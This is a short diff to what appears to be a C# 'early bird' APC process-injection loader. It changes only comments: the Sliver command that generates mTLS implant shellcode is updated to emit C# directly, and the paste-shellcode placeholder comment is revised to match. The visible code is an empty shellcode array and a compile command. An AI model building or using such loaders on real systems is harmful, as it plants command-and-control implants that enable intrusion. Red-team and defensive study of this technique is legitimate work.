@@ -7,8 +7,7 @@
 // shellcode before the process's own entry point — "early bird".
 //
 // Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-//   python3 ../../sliver/sliver2arrays.py /tmp/sc.bin --csharp
+//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
 //
 // Compile (Release, x64):
 //   csc /target:exe /platform:x64 /optimize+ /out:apc-injection.exe apc-injection.cs
@@ -69,7 +68,7 @@ namespace ApcInjection
 
         static void Main(string[] args)
         {
-            // ── Paste your shellcode here (from sliver2arrays.py --csharp) ─────
+            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
